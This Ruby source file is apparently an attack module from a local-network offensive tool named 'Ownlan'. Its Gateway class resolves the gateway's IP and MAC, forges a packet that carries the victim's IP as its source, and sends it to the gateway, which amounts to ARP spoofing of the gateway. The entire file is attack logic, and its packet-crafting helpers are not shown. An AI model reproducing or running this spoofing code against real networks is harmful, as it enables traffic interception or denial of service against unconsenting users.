module Ownlan
  module Attack
    class Gateway < Base

      def process
        gw_ip  = ServiceObjects::NetworkInformation.gateway_ip
        gw_mac = ip_to_mac(gw_ip)

        saddr    = config.source_mac
        daddr    = gw_mac
        saddr_ip = victim_ip
        daddr_ip = gw_ip

        crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip).call

        send_packet(config, crafted_packet)
      end

    end
  end
end